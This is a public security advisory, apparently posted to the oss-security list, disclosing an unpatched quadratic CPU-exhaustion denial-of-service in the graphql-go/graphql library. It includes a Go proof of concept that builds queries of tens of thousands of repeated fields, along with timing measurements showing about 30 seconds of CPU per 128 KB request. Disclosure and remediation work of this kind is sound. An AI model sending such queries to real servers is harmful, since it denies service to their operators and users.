X-Archive-Source: openwall-scrape
X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/09/14/26
Message-ID: <CADCSfHWj+4vKKtsiFgFMbSLAogQEDp+_NJbKfVoESbKEziLevA@mail.gmail.com>
Date: Mon, 14 Sep 2026 20:24:03 +0300
From: Evgenios Gkritsis <evgeniosgkritsis@...il.com>
To: oss-security@...ts.openwall.com
Subject: graphql-go/graphql <= 0.8.1: quadratic CPU-exhaustion DoS via OverlappingFieldsCanBeMergedRule
Content-Type: text/plain; charset=utf-8

Hello,

This reports an algorithmic-complexity denial-of-service defect in
github.com/graphql-go/graphql, affecting all released versions up to and
including the latest, v0.8.1. No fixed version exists. The project has no
private security-reporting channel (GitHub private vulnerability reporting
is disabled and there is no SECURITY.md), so this is disclosed publicly.

It is unauthenticated, network-reachable, triggered purely by
attacker-controlled query text, and requires no malformed input and no
schema dependency beyond a single queryable field. Reproduced against
v0.8.1 from the Go module proxy on Go 1.22.

Affected:

  Product:  github.com/graphql-go/graphql
  Versions: all <= v0.8.1; no fix available
  CWE:      CWE-407 (Inefficient Algorithmic Complexity) / CWE-1050
  CVSS:     CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H = 7.5 (High)

Details:

OverlappingFieldsCanBeMergedRule is part of graphql.SpecifiedRules, which
graphql.Do runs on every request with no way for the caller to override the
rule set. In rules_overlapping_fields_can_be_merged.go,
collectConflictsWithin() compares every field sharing a response name
against every other field in the same list:

  for i := 0; i < len(fields); i++ {
      for k := i + 1; k < len(fields); k++ {
          conflict := rule.findConflict(isMutuallyExclusive, responseName,
fields[i], fields[k])
          ...
      }
  }

A query containing n repeated fields with the same response name
({ a a a ... a }) places all n fields into one list in fieldMap. The
nested loop performs n(n-1)/2 comparisons, and every one returns
"no conflict" because the fields are identical. The rule never
short-circuits on identical fields.

PoC:

  package main

  import (
      "fmt"
      "math"
      "strings"
      "time"

      "github.com/graphql-go/graphql"
  )

  func main() {
      schema, _ := graphql.NewSchema(graphql.SchemaConfig{
          Query: graphql.NewObject(graphql.ObjectConfig{
              Name: "Query",
              Fields: graphql.Fields{
                  "a": &graphql.Field{Type: graphql.String},
              },
          }),
      })

      counts := []int{1000, 2000, 4000, 8000, 16000, 32000, 64000}
      var times []float64

      for _, n := range counts {
          query := "{ " + strings.Repeat("a ", n) + "}"
          t0 := time.Now()
          graphql.Do(graphql.Params{Schema: schema, RequestString: query})
          elapsed := time.Since(t0).Seconds()
          times = append(times, elapsed)
          fmt.Printf("%8d fields  %10.4fs\n", n, elapsed)
      }

      var sum float64
      for i := 1; i < len(counts); i++ {
          sum += math.Log(times[i]/times[i-1]) /
math.Log(float64(counts[i])/float64(counts[i-1]))
      }
      fmt.Printf("\nmean local exponent: k ~= %.2f\n",
sum/float64(len(counts)-1))
  }

Measured against v0.8.1 (Go 1.22, Linux x86_64):

      1000 fields      0.0133s
      2000 fields      0.0420s
      4000 fields      0.1428s
      8000 fields      0.4935s
     16000 fields      1.8330s
     32000 fields      7.2700s
     64000 fields     30.0548s

  mean local exponent: k ~= 1.86

The largest interval (32,000 -> 64,000) is a 4.13x increase for a 2x
input -- local exponent 2.05. A 128 KB query with 64,000 repeated fields
consumes 30 seconds of CPU in validation, before any resolver runs.

Attribution confirmed by control run:

Running the same benchmark with OverlappingFieldsCanBeMergedRule removed
from the rule set (via graphql.ValidateDocument called directly with a
filtered slice):

      1000 fields      0.0041s
      2000 fields      0.0128s
      4000 fields      0.0440s
      8000 fields      0.0616s
     16000 fields      0.1098s
     32000 fields      0.2631s
     64000 fields      0.3747s

  mean local exponent: k ~= 1.08

At n = 64,000 the cost drops from 30.05s to 0.37s (80x speedup) and the
exponent drops from 1.86 to 1.08. The quadratic term is entirely inside
OverlappingFieldsCanBeMergedRule.

No application-level mitigation is possible. graphql.Do hardcodes
ValidateDocument(&p.Schema, AST, nil), and a nil rule set defaults to
SpecifiedRules. graphql.Params exposes no ValidationRules field. An
application cannot exclude this rule without patching the library or
bypassing graphql.Do entirely.

Impact:

A single unauthenticated ~128 KB request consumes ~30s of server CPU. A
handful of concurrent requests saturate the worker pool and deny service.
The attacker needs no authentication, no valid schema knowledge beyond the
presence of any queryable field, and no malformed input. The query has
depth 1, so depth-limit mitigations do not apply.

Relationship to existing reports:

Distinct from the three graphql-go findings already disclosed on this list:

  - 2026-08-25: coerceString / coerceBool -> type confusion and
    stack-overflow DoS
  - 2026-08-26: gqlerrors.GetLocation per-error rescan -> O(n^2)
  - 2026-08-29: highlightSourceAtLocation -> O(column^2)

This one is collectConflictsWithin -> O(fields^2).

The same overlapping-fields quadratic was fixed in webonyx/graphql-php as
CVE-2026-40476 (fixed in 15.31.5) and in graph-gophers/graphql-go v1.7.1
(PR #678). It has not been reported against graphql-go/graphql.

Remediation:

Deduplicate identical fields before the pairwise loop, or replace the
nested loop with a hash-based comparison keyed on field response name and
arguments. No fixed release exists.

Credit:

Evgenios Gkritsis, Athena Research Center & University of Piraeus, Athens,
Greece
Constantinos Patsakis, Athena Research Center & University of Piraeus,
Athens, Greece
George C. Stergiopoulos, Athens University of Economics and Business,
Athens, Greece

